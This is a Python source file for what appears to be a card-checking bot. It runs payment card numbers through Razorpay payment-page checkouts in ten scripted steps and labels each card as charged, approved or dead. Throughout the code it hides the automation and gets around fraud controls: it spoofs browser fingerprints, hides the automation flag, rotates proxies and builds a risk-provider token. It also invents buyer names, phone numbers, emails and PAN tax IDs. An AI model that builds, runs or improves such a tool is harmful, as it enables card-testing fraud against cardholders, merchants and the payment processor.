# =============================================================================
# razorpay_engine.py — Razorpay Engine v3.0.0 (Unified)
# =============================================================================
# Merges every smart trick from:
#   - previous razorpay_engine.py       (Playwright, api-less flow)
#   - Go AUTO RAZORPAY file             (brace-counting parser, 9-step curl flow,
#                                        balance/cvv → approved classification)
#   - rzp (1).py                        (live checkout.js build token fetch)
#   - app.py                            (shared browser session, currency convert)
#   - main (4).py                       (post-3DS payment_status check)
#
# Public API (bot.py imports these — do not rename):
#   run_razorpay_public(site_url, card, proxy_url) -> dict
#   run_razorpay_async(site_url, card, proxy_url)  -> dict
#   engine_stats()                                 -> dict
#   shutdown()                                     -> None
#
# Dependencies: curl_cffi (already required), playwright (already required)
# =============================================================================

import asyncio
import base64
import hashlib
import json
import os
import random
import re
import secrets
import string
import threading
import time
import urllib.parse
from typing import Optional, Tuple

from curl_cffi import requests as cffi_requests
from curl_cffi.requests import Session

import logging
logger = logging.getLogger("razorpay")
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(_h)
    logger.setLevel(logging.INFO)

VERSION = "3.0.0"

# ──────────────────────── constants ────────────────────────────────────

BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

RZ_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

RZ_BUILD_FALLBACK    = "afa3662e035e66c495f2ddc21c6f030530870f53"
RZ_BUILD_V1_FALLBACK = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

RAZORPAY_FIRST_NAMES = [
    "Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan","Rahul",
    "Ravi","Amit","Vikram","Anil","Sunil","Rajesh","Sanjay","Deepak","Manoj","Suresh",
]
RAZORPAY_LAST_NAMES = [
    "Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta","Nair",
    "Shah","Das","Bose","Chopra","Malhotra","Saxena","Rao","Desai","Pillai","Menon",
]
RAZORPAY_EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]

# Shared browser for 3DS classification (kills per-card boot cost)
_BROWSER_LOCK    = threading.Lock()
_SHARED_PW       = None
_SHARED_BROWSER  = None

# ──────────────────────── helpers ──────────────────────────────────────

def _rand_phone() -> str:
    first = random.choice(["6","7","8","9"])
    rest  = "".join(str(random.randint(0,9)) for _ in range(9))
    return "+91" + first + rest

def _rand_name() -> str:
    return f"{random.choice(RAZORPAY_FIRST_NAMES)} {random.choice(RAZORPAY_LAST_NAMES)}"

def _rand_email(name: str) -> str:
    return (name.lower().replace(" ", ".") + str(random.randint(1, 999))
            + "@" + random.choice(RAZORPAY_EMAIL_DOMAINS))

def _rand_pan() -> str:
    return ("".join(random.choices(string.ascii_uppercase, k=5))
            + "".join(random.choices(string.digits, k=4))
            + random.choice(string.ascii_uppercase))

def _build_device_id() -> Tuple[str, str]:
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    return f"1.{h}.{ts}.{rnd}", h

def _build_unified_session_id() -> str:
    return "".join(secrets.choice(BASE62) for _ in range(14))

def _build_sardine_token(checkout_id: str) -> str:
    payload = [
        {"name": "sardine", "metadata": {"session_id": checkout_id}},
        {"name": "stripe_radar", "metadata": {
            "session_id": "rse_" + "".join(
                secrets.choice(string.ascii_letters + string.digits) for _ in range(22)
            )
        }},
    ]
    return base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()

def _normalize_url(url: str) -> str:
    if not url: return url
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url

def _parse_proxy(p: Optional[str]) -> Optional[str]:
    if not p: return None
    p = p.strip()
    if not p: return None
    if "://" in p: return p
    if "@" in p: return "http://" + p
    parts = p.split(":")
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def _parse_card(cc: str) -> dict:
    parts = cc.split("|")
    if len(parts) != 4:
        raise ValueError("CC format must be CC|MM|YYYY|CVV")
    return {
        "number": parts[0].strip().replace(" ", ""),
        "month":  parts[1].strip().zfill(2),
        "year":   parts[2].strip()[-2:],
        "cvv":    parts[3].strip(),
    }

def _card_brand(cc: str) -> str:
    if cc.startswith("4"): return "visa"
    if cc[:2] in ("51","52","53","54","55"): return "mastercard"
    if cc[:2] in ("34","37"): return "amex"
    if cc.startswith("6011") or cc.startswith("65"): return "discover"
    if cc.startswith("35"): return "jcb"
    if cc.startswith("62"): return "unionpay"
    return "unknown"

# ──────────────────────── brace-counting JSON parser ───────────────────

def _extract_var_json(text: str, varname: str = "data") -> str:
    """
    Brace-counting JSON extractor. Replaces the fragile regex approach that
    truncates on nested objects (Go's RE2 doesn't backtrack; Python's re
    technically does but non-greedy .*? still stops at the first `}`).
    """
    prefix = f"var {varname} ="
    i = text.find(prefix)
    if i == -1: return ""
    i += len(prefix)
    while i < len(text) and text[i] in " \t\r\n":
        i += 1
    if i >= len(text) or text[i] != "{":
        return ""
    depth = 0
    in_str = False
    esc = False
    start = i
    while i < len(text):
        c = text[i]
        if esc:
            esc = False
        elif c == "\\" and in_str:
            esc = True
        elif c == '"':
            in_str = not in_str
        elif not in_str:
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[start:i+1]
        i += 1
    return ""

# ──────────────────────── error classification ─────────────────────────

_RZ_BALANCE_KEYWORDS = [
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
]

def _is_balance_or_cvv(desc: str, code: str) -> bool:
    m = (desc or "").lower()
    c = (code or "").lower()
    if any(k in m for k in _RZ_BALANCE_KEYWORDS): return True
    if "cvv provided is incorrect" in m: return True
    if "ncorrect_cvv" in m: return True
    if c == "incorrect_cvv": return True
    return False

def _clean_desc(desc: str) -> str:
    if not desc: return ""
    return desc.replace(
        " Try another payment method or contact your bank for details.", ""
    ).strip()

# ──────────────────────── shared browser (3DS only) ────────────────────

def _get_shared_browser(proxy_config: Optional[dict] = None):
    global _SHARED_PW, _SHARED_BROWSER
    with _BROWSER_LOCK:
        if _SHARED_BROWSER is not None and _SHARED_BROWSER.is_connected():
            return _SHARED_BROWSER
        try:
            if _SHARED_BROWSER is not None:
                _SHARED_BROWSER.close()
        except Exception:
            pass
        try:
            if _SHARED_PW is not None:
                _SHARED_PW.stop()
        except Exception:
            pass

        from playwright.sync_api import sync_playwright
        _SHARED_PW = sync_playwright().start()
        _SHARED_BROWSER = _SHARED_PW.chromium.launch(
            headless=True,
            proxy=proxy_config,
            args=["--no-sandbox","--disable-dev-shm-usage","--disable-gpu",
                  "--disable-blink-features=AutomationControlled"],
        )
        return _SHARED_BROWSER

def _close_shared_browser():
    global _SHARED_PW, _SHARED_BROWSER
    with _BROWSER_LOCK:
        try:
            if _SHARED_BROWSER is not None:
                _SHARED_BROWSER.close()
        except Exception:
            pass
        try:
            if _SHARED_PW is not None:
                _SHARED_PW.stop()
        except Exception:
            pass
        _SHARED_BROWSER = None
        _SHARED_PW = None

# ──────────────────────── sync HTTP client (curl_cffi) ────────────────

class RZClient:
    def __init__(self, proxy_url: Optional[str] = None, impersonate: str = "chrome124"):
        self.proxy_url = proxy_url or ""
        self.impersonate = impersonate
        kw = {"impersonate": impersonate, "timeout": 30}
        if self.proxy_url:
            kw["proxy"] = self.proxy_url
        self.session = Session(**kw)
        self.ua = random.choice(RZ_USER_AGENTS)
        self.session.headers.update({
            "User-Agent": self.ua,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        })

    def get(self, url, **kw):
        kw.setdefault("timeout", 30); return self.session.get(url, **kw)
    def post(self, url, data=None, json=None, headers=None, **kw):
        kw.setdefault("timeout", 30); return self.session.post(url, data=data, json=json, headers=headers, **kw)
    def close(self):
        try: self.session.close()
        except Exception: pass


# =============================================================================
# STEP 1 — page → var data
# =============================================================================

def _step1_fetch_page(client: RZClient, rz_url: str) -> dict:
    resp = client.get(rz_url, headers={
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    })
    html_text = resp.text

    raw = _extract_var_json(html_text, "data")
    if not raw:
        raise Exception("no `var data = {...}` on page")

    try:
        init = json.loads(raw)
    except json.JSONDecodeError:
        try:
            inner = json.loads(raw)
            if isinstance(inner, str):
                init = json.loads(inner)
            else:
                init = inner
        except Exception as e:
            raise Exception(f"page data decode failed: {e}")

    if not isinstance(init, dict):
        raise Exception("page data not an object")

    if "error_code" in init:
        msg = init.get("message") or init.get("error_code")
        raise Exception(f"page error: {msg}")

    key_id    = init.get("key_id") or init.get("key") or ""
    keyless   = init.get("keyless_header", "") or ""
    plink = ppid = ""

    pl_obj = init.get("payment_link") or init.get("payment_page") or {}
    if isinstance(pl_obj, dict):
        plink = pl_obj.get("id", "")
        items = pl_obj.get("payment_page_items") or []
        if items and isinstance(items, list):
            it = items[0] or {}
            ppid = it.get("id", "")

    if not key_id:
        raise Exception("key_id missing on page")
    if not plink:
        raise Exception("payment_link_id missing on page")
    if not ppid:
        raise Exception("payment_page_item_id missing on page")

    amount = 100
    try:
        items = (init.get("payment_link") or {}).get("payment_page_items") or []
        if items:
            it = items[0] or {}
            raw_amt = ((it.get("item") or {}).get("amount")
                       or it.get("amount"))
            if raw_amt:
                amount = int(raw_amt)
        if amount < 100:
            amount = int(init.get("payment_link", {}).get("min_amount_value") or 100)
    except Exception:
        amount = 100
    if amount < 100: amount = 100

    return {
        "key_id":         key_id,
        "keyless_header": keyless,
        "payment_link_id": plink,
        "payment_page_item_id": ppid,
        "amount":         amount,
        "raw_html":       html_text,
    }

# ──────────────────────── step 1b: live build tokens ──────────────────

_BUILD_CACHE = {"build": None, "build_v1": None, "ts": 0}
_BUILD_TTL   = 3600
_BUILD_LOCK  = threading.Lock()

def _step1b_fetch_build_tokens(client: RZClient) -> Tuple[str, str]:
    now = time.time()
    with _BUILD_LOCK:
        if _BUILD_CACHE["build"] and (now - _BUILD_CACHE["ts"]) < _BUILD_TTL:
            return _BUILD_CACHE["build"], _BUILD_CACHE["build_v1"]
    build, build_v1 = RZ_BUILD_FALLBACK, RZ_BUILD_V1_FALLBACK
    try:
        resp = client.get("https://checkout.razorpay.com/v1/checkout.js", timeout=15)
        if resp.status_code == 200:
            txt = resp.text
            m = re.search(r'g\s*=\s*"([a-f0-9]{40})"', txt)
            if m: build = m.group(1)
            m = re.search(r'build_v1\s*:\s*"([a-f0-9]{40})"', txt)
            if m: build_v1 = m.group(1)
    except Exception as e:
        logger.debug(f"checkout.js fetch failed, using fallback: {e!r}")
    with _BUILD_LOCK:
        _BUILD_CACHE["build"]    = build
        _BUILD_CACHE["build_v1"] = build_v1
        _BUILD_CACHE["ts"]       = now
    return build, build_v1

# ──────────────────────── step 2: create order ────────────────────────

def _step2_create_order(client: RZClient, page_url: str, plink: str,
                        ppid: str, amount: int) -> str:
    origin = "https://" + (urllib.parse.urlparse(page_url).hostname or "pages.razorpay.com")
    r = client.post(
        f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": origin + "/",
        },
        json={
            "notes": {"comment": "", "name": "User"},
            "line_items": [{"payment_page_item_id": ppid, "amount": amount}],
        },
    )
    try:
        data = r.json()
    except Exception:
        raise Exception(f"order response not json: {r.text[:120]}")

    if isinstance(data, dict) and "error" in data:
        raise Exception(f"order error: {data['error'].get('description', 'unknown')}")

    order_id = (data.get("order") or {}).get("id")
    if not order_id:
        raise Exception("order id missing in response")
    return order_id

# ──────────────────────── step 3: get session token ───────────────────

def _step3_get_session(client: RZClient, page_url: str, build: str, build_v1: str,
                       keyless_header: str, device_id: str, unified_id: str) -> str:
    origin = "https://" + (urllib.parse.urlparse(page_url).hostname or "pages.razorpay.com")
    params = {
        "traffic_env": "production",
        "build": build,
        "build_v1": build_v1,
        "checkout_v2": "1",
        "new_session": "1",
        "keyless_header": keyless_header,
        "rzp_device_id": device_id,
        "unified_session_id": unified_id,
    }
    r = client.get(
        "https://api.razorpay.com/v1/checkout/public",
        params=params,
        headers={
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Referer": origin + "/",
        },
    )
    txt = r.text
    m = re.search(r'window\.session_token="([^"]+)"', txt)
    if m: return m.group(1)
    m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', txt)
    if m: return m.group(1)
    raise Exception("session_token not found in public checkout response")

# ──────────────────────── step 4/5/6: preflight (side-effects) ────────

def _step4_preferences(client: RZClient, order_id: str, session_token: str,
                       keyless_header: str, device_id: str, fhash: str,
                       amount: int, currency: str, plink: str, phone: str) -> None:
    resources = [
        "checkout_version_config", "merchant", "merchant_features", "downtime",
        "customer", "customer_tokens", "truecaller", "methods", "experiments",
        "offers", "checkout_config", "order", "invoice", "buyer_protection",
        "personalization",
    ]
    payload = {
        "query": [{"resource": r} for r in resources],
        "query_params": {
            "device_id": device_id,
            "rtb_device_id": fhash,
            "amount": amount,
            "currency": currency,
            "option_currency": currency,
            "truecaller": False,
            "qr_required": False,
            "library": "checkoutjs",
            "platform": "browser",
            "order_id": order_id,
            "payment_link_id": plink,
            "contact": phone,
        },
        "action": "get",
    }
    try:
        client.post(
            ("https://api.razorpay.com/v2/standard_checkout/preferences"
             f"?x_entity_id={order_id}&session_token={session_token}&keyless_header={keyless_header}"),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Origin": "https://api.razorpay.com",
                "x-session-token": session_token,
            },
            json=payload,
        )
    except Exception as e:
        logger.debug(f"preferences failed (non-fatal): {e!r}")

def _step5_checkout_order(client: RZClient, order_id: str, checkout_id: str,
                          key_id: str, session_token: str, keyless_header: str,
                          device_id: str, fhash: str, build: str,
                          amount: int, currency: str, plink: str,
                          phone: str, email: str, page_url: str) -> None:
    form = {
        "notes[email]": email,
        "notes[phone]": phone[3:],
        "payment_link_id": plink,
        "key_id": key_id,
        "contact": phone,
        "email": email,
        "currency": currency,
        "_[integration]": "payment_pages",
        "_[device.id]": device_id,
        "_[library]": "checkoutjs",
        "_[library_src]": "no-src",
        "_[current_script_src]": "no-src",
        "_[platform]": "browser",
        "_[env]": "",
        "_[is_magic_script]": "false",
        "_[os]": "windows",
        "_[shield][fhash]": fhash,
        "_[shield][tz]": "0",
        "_[device_id]": device_id,
        "_[build]": build,
        "_[shield][os]": "windows",
        "_[shield][platform]": "browser",
        "_[shield][browser]": "chrome",
        "_[request_index]": "0",
        "amount": str(amount),
        "order_id": order_id,
        "method": "card",
        "checkout_id": checkout_id,
    }
    try:
        client.post(
            ("https://api.razorpay.com/v1/standard_checkout/checkout/order"
             f"?key_id={key_id}&session_token={session_token}&keyless_header={keyless_header}"),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://api.razorpay.com",
                "x-session-token": session_token,
            },
            data=form,
        )
    except Exception as e:
        logger.debug(f"checkout_order failed (non-fatal): {e!r}")

def _step6_cross_border(client: RZClient, order_id: str, keyless_header: str,
                        device_id: str, session_token: str,
                        amount: int, currency: str, brand: str) -> None:
    keyless_url = urllib.parse.quote(keyless_header, safe="")
    payload = {
        "identifiers": {
            "merchant": {"country": "IN"},
            "card": {
                "country": "US",
                "dcc_blacklist": False,
                "network": brand,
            },
            "method": "card",
            "payment_currency": currency,
        },
        "forex_charges": {
            "amount": amount,
            "currency": currency,
            "filters": {"method": "card"},
        },
    }
    try:
        client.post(
            (f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
             f"?x_entity_id={order_id}&keyless_header={keyless_url}"),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Origin": "https://api.razorpay.com",
                "x-session-token": session_token,
            },
            json=payload,
        )
    except Exception as e:
        logger.debug(f"cb_flows failed (non-fatal): {e!r}")

# ──────────────────────── step 7: create payment ──────────────────────

def _step7_create_payment(
    client: RZClient,
    page_url: str,
    key_id: str,
    session_token: str,
    keyless_header: str,
    device_id: str,
    fhash: str,
    build: str,
    order_id: str,
    checkout_id: str,
    plink: str,
    amount: int,
    currency: str,
    card: dict,
    card_name: str,
    email: str,
    phone: str,
) -> dict:
    token_create = _build_sardine_token(checkout_id)
    form = {
        "user_risk_providers_token": token_create,
        "notes[comment]": "",
        "notes[email]": email,
        "notes[phone]": phone[3:],
        "notes[full_name_of_the_donor]": card_name,
        "notes[full_address_of_the_donor]": "NA",
        "notes[pan_number]": _rand_pan(),
        "payment_link_id": plink,
        "key_id": key_id,
        "contact": phone,
        "email": email,
        "currency": currency,
        "_[integration]": "payment_pages",
        "_[checkout_id]": checkout_id,
        "_[device.id]": device_id,
        "_[env]": "",
        "_[library]": "checkoutjs",
        "_[library_src]": "no-src",
        "_[current_script_src]": "no-src",
        "_[is_magic_script]": "false",
        "_[platform]": "browser",
        "_[referer]": page_url,
        "_[shield][fhash]": fhash,
        "_[shield][tz]": "-330",
        "_[device_id]": device_id,
        "_[build]": build,
        "_[shield][os]": "windows",
        "_[shield][platform]": "browser",
        "_[shield][browser]": "chrome",
        "_[request_index]": "1",
        "amount": str(amount),
        "order_id": order_id,
        "method": "card",
        "card[number]": card["number"],
        "card[cvv]": card["cvv"],
        "card[name]": card_name,
        "card[expiry_month]": card["month"],
        "card[expiry_year]": "20" + card["year"],
        "save": "0",
        "dcc_currency": currency,
    }
    r = client.post(
        ("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
         f"?x_entity_id={order_id}&session_token={session_token}&keyless_header={keyless_header}"),
        headers={
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://api.razorpay.com",
            "x-session-token": session_token,
        },
        data=form,
    )
    try:
        return r.json()
    except Exception:
        raise Exception(f"create/ajax not json: {r.text[:120]}")

# ──────────────────────── step 8: 3DS2 auth ───────────────────────────

def _step8_3ds2_auth(client: RZClient, payment_id: str, session_token: str) -> None:
    pid_clean = payment_id.split("_", 1)[1] if "_" in payment_id else payment_id
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://api.razorpay.com",
        "x-session-token": session_token,
    }
    try:
        client.post(
            f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate",
            headers=headers,
        )
    except Exception:
        pass

    time.sleep(1)

    browser_data = {
        "browser[java_enabled]": "false",
        "browser[javascript_enabled]": "true",
        "browser[timezone_offset]": "0",
        "browser[color_depth]": str(random.choice([24, 32])),
        "browser[screen_width]": str(random.choice([1920, 1366, 1536, 1440])),
        "browser[screen_height]": str(random.choice([1080, 768, 864, 900])),
        "browser[language]": "en-US",
        "auth_step": "3ds2Auth",
    }
    try:
        client.post(
            f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
            headers=headers,
            data=browser_data,
        )
    except Exception:
        pass

# ──────────────────────── step 9: cancel + read error ─────────────────

def _step9_cancel_and_classify(client: RZClient, payment_id: str, key_id: str,
                                session_token: str, keyless_header: str,
                                page_url: str) -> Tuple[str, str, str]:
    """
    Returns (final_status, code, description)
    final_status ∈ {"charged", "approved", "declined"}
    """
    origin = "https://" + (urllib.parse.urlparse(page_url).hostname or "pages.razorpay.com")
    try:
        r = client.get(
            (f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel"
             f"?key_id={key_id}&session_token={session_token}&keyless_header={keyless_header}"),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=production",
                "x-session-token": session_token,
            },
        )
    except Exception as e:
        return "declined", "CANCEL_ERROR", str(e)[:120]

    txt = r.text

    if "razorpay_payment_id" in txt:
        return "charged", "PAYMENT_CAPTURED", "Payment Successful"

    try:
        j = r.json()
    except Exception:
        return "declined", "PARSE_ERROR", txt[:120]

    err = j.get("error") or {}
    desc = _clean_desc(err.get("description") or "")
    code = (err.get("reason") or "").strip()

    if _is_balance_or_cvv(desc, code):
        return "approved", (code or "INSUFFICIENT_FUNDS").upper()[:60], (desc or code)

    if not desc and not code:
        return "declined", "UNKNOWN_DECLINE", "Unknown decline"

    label_code = (code or "DECLINED").upper()[:60]
    label_desc = desc or code or "declined"
    return "declined", label_code, label_desc

# ──────────────────────── step 10: payment status check ───────────────

def _step10_payment_status(client: RZClient, payment_id: str, key_id: str,
                            session_token: str, keyless_header: str) -> str:
    try:
        r = client.get(
            f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}",
            params={
                "key_id": key_id,
                "session_token": session_token,
                "keyless_header": keyless_header,
            },
            headers={
                "Accept": "*/*",
                "Referer": "https://api.razorpay.com/v1/checkout/public?traffic_env=production",
                "x-session-token": session_token,
            },
        )
        if r.status_code == 200:
            try:
                return (r.json().get("status") or "unknown").lower()
            except Exception:
                return "unknown"
    except Exception:
        pass
    return "unknown"

# ──────────────────────── step 3DS: playwright visit ──────────────────

def _visit_redirect_and_classify(redirect_url: str, proxy_url: Optional[str]) -> str:
    """
    Returns one of: "signature" (charged), "3ds" (needs auth), "failure", "unknown"
    """
    proxy_cfg = None
    if proxy_url:
        parsed = urllib.parse.urlparse(proxy_url)
        if parsed.hostname and parsed.port:
            proxy_cfg = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"}
            if parsed.username:
                proxy_cfg["username"] = urllib.parse.unquote(parsed.username)
            if parsed.password:
                proxy_cfg["password"] = urllib.parse.unquote(parsed.password)

    try:
        browser = _get_shared_browser(proxy_cfg)
        ctx = browser.new_context(
            user_agent=random.choice(RZ_USER_AGENTS),
            viewport={"width": 1366, "height": 768},
            locale="en-IN",
            timezone_id="Asia/Kolkata",
        )
        page = ctx.new_page()
        try:
            page.goto(redirect_url, timeout=45000, wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=8000)
            except Exception:
                pass
            try:
                page.wait_for_timeout(2500)
            except Exception:
                pass

            html = page.content()
            low = html.lower()

            if "razorpay_signature" in low or "payment successful" in low:
                return "signature"
            if "payment failed" in low or "transaction failed" in low:
                return "failure"
            if any(k in low for k in ("3d secure","3ds","authenticate your card",
                                       "otp has been sent","enter otp","acs")):
                return "3ds"
            if any(k in low for k in ("processing","please wait")):
                try:
                    page.wait_for_timeout(4000)
                    html2 = page.content().lower()
                    if "razorpay_signature" in html2 or "payment successful" in html2:
                        return "signature"
                    if "payment failed" in html2 or "transaction failed" in html2:
                        return "failure"
                except Exception:
                    pass
                return "unknown"
            return "unknown"
        finally:
            try: page.close()
            except Exception: pass
            try: ctx.close()
            except Exception: pass
    except Exception as e:
        logger.debug(f"redirect visit failed: {e!r}")
        return "unknown"


# =============================================================================
# ORCHESTRATOR
# =============================================================================

def run_razorpay_for_card(page_url: str, card: str,
                          proxy_url: Optional[str] = None) -> dict:
    """
    Full 9-step flow. Returns a dict with keys:
      ok, status, message, response, site, card, time
    """
    t_start = time.time()
    site_name = urllib.parse.urlparse(_normalize_url(page_url)).hostname or page_url
    result = {
        "ok": False,
        "status": "Dead",
        "message": "",
        "response": "",
        "site": _normalize_url(page_url),
        "card": card,
        "time": 0.0,
    }

    proxy_clean = _parse_proxy(proxy_url)

    try:
        card_obj = _parse_card(card)
    except Exception as e:
        result["status"] = "Error"
        result["message"] = str(e)[:150]
        result["response"] = result["message"]
        result["time"] = time.time() - t_start
        return result

    client = RZClient(proxy_url=proxy_clean)
    try:
        # step 1
        try:
            page = _step1_fetch_page(client, _normalize_url(page_url))
        except Exception as e:
            result["status"] = "Error"
            result["message"] = f"step1: {e}"
            result["response"] = result["message"]
            return _finalize(result, t_start)

        key_id         = page["key_id"]
        keyless_header = page["keyless_header"]
        plink          = page["payment_link_id"]
        ppid           = page["payment_page_item_id"]
        amount         = page["amount"]

        # step 1b
        build, build_v1 = _step1b_fetch_build_tokens(client)

        device_id, fhash  = _build_device_id()
        unified_id        = _build_unified_session_id()
        card_name         = _rand_name()
        email             = _rand_email(card_name)
        phone             = _rand_phone()
        currency          = "INR"
        brand             = _card_brand(card_obj["number"])

        # step 2
        try:
            order_id = _step2_create_order(client, page_url, plink, ppid, amount)
        except Exception as e:
            result["status"] = "Error"
            result["message"] = f"step2: {e}"
            result["response"] = result["message"]
            return _finalize(result, t_start)

        # step 3
        try:
            session_token = _step3_get_session(
                client, page_url, build, build_v1, keyless_header, device_id, unified_id
            )
        except Exception as e:
            result["status"] = "Error"
            result["message"] = f"step3: {e}"
            result["response"] = result["message"]
            return _finalize(result, t_start)

        checkout_id = session_token

        # step 4/5/6 (best effort)
        _step4_preferences(client, order_id, session_token, keyless_header,
                           device_id, fhash, amount, currency, plink, phone)
        _step5_checkout_order(client, order_id, checkout_id, key_id, session_token,
                              keyless_header, device_id, fhash, build,
                              amount, currency, plink, phone, email, page_url)
        _step6_cross_border(client, order_id, keyless_header, device_id,
                            session_token, amount, currency, brand)

        # step 7
        try:
            pay = _step7_create_payment(
                client, page_url, key_id, session_token, keyless_header,
                device_id, fhash, build, order_id, checkout_id, plink,
                amount, currency, card_obj, card_name, email, phone,
            )
        except Exception as e:
            result["status"] = "Error"
            result["message"] = f"step7: {e}"
            result["response"] = result["message"]
            return _finalize(result, t_start)

        # extract payment id / redirect
        payment_id = ""
        redirect_url = ""
        try:
            if isinstance(pay, dict):
                err = pay.get("error") or {}
                if err:
                    desc = _clean_desc(err.get("description") or "")
                    code = (err.get("reason") or "").strip()
                    if _is_balance_or_cvv(desc, code):
                        result["status"] = "Approved"
                        result["message"] = (desc or code or "Approved")
                        result["response"] = result["message"]
                        return _finalize(result, t_start)
                    result["status"] = "Dead"
                    result["message"] = desc or code or "declined"
                    result["response"] = result["message"]
                    return _finalize(result, t_start)
                payment_id = (pay.get("payment") or {}).get("id", "")
                redirect_url = ((pay.get("payment") or {}).get("next") or [{}])[0].get("url", "") \
                    if isinstance((pay.get("payment") or {}).get("next"), list) else ""
                if not redirect_url:
                    redirect_url = ((pay.get("redirect") or {}) or {}).get("url", "")
        except Exception:
            pass

        if not payment_id:
            result["status"] = "Error"
            result["message"] = "step7: no payment id"
            result["response"] = result["message"]
            return _finalize(result, t_start)

        # step 8
        _step8_3ds2_auth(client, payment_id, session_token)

        # step 9 — cancel
        status, code, desc = _step9_cancel_and_classify(
            client, payment_id, key_id, session_token, keyless_header, page_url
        )

        # redirect classification if we got one
        if status == "declined" and redirect_url:
            try:
                sig = _visit_redirect_and_classify(redirect_url, proxy_clean)
                if sig == "signature":
                    status, code, desc = "charged", "PAYMENT_CAPTURED", "Payment Successful"
                elif sig == "3ds":
                    status, code, desc = "approved", "3DS_AUTHENTICATION", "3DS authentication required"
            except Exception:
                pass

        # step 10 — post-3DS payment status poll
        if status == "declined":
            try:
                ps = _step10_payment_status(client, payment_id, key_id,
                                            session_token, keyless_header)
                if ps in ("captured", "authorized"):
                    status, code, desc = "charged", "PAYMENT_CAPTURED", "Payment Successful"
                elif ps == "failed":
                    # keep as declined
                    pass
            except Exception:
                pass

        if status == "charged":
            result["ok"] = True
            result["status"] = "Charged"
            result["message"] = desc or "Payment Successful"
            result["response"] = result["message"]
        elif status == "approved":
            result["status"] = "Approved"
            result["message"] = desc or code or "Approved"
            result["response"] = result["message"]
        else:
            result["status"] = "Dead"
            result["message"] = desc or code or "declined"
            result["response"] = result["message"]

        return _finalize(result, t_start)

    except Exception as e:
        result["status"] = "Error"
        result["message"] = str(e)[:150]
        result["response"] = result["message"]
        return _finalize(result, t_start)
    finally:
        try:
            client.close()
        except Exception:
            pass


def _finalize(result: dict, t_start: float) -> dict:
    result["time"] = time.time() - t_start
    return result


# =============================================================================
# PUBLIC WRAPPERS
# =============================================================================

def run_razorpay_public(site_url: str, card: str,
                        proxy_url: Optional[str] = None) -> dict:
    return run_razorpay_for_card(site_url, card, proxy_url)


async def run_razorpay_async(site_url: str, card: str,
                             proxy_url: Optional[str] = None) -> dict:
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        None, run_razorpay_for_card, site_url, card, proxy_url
    )


# =============================================================================
# STATS / SHUTDOWN / CLI
# =============================================================================

def engine_stats() -> dict:
    return {
        "version": VERSION,
        "engine": "curl_cffi + playwright (shared browser)",
        "browser_alive": bool(_SHARED_BROWSER is not None and _SHARED_BROWSER.is_connected()),
        "build_cache_ttl": _BUILD_TTL,
    }


def shutdown():
    _close_shared_browser()


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python razorpay_engine.py <card|mm|yyyy|cvv> <payment_page_url> [proxy]")
        print(f"Version: {VERSION}")
        print(f"Stats: {engine_stats()}")
        sys.exit(1)
    card = sys.argv[1]
    page = sys.argv[2]
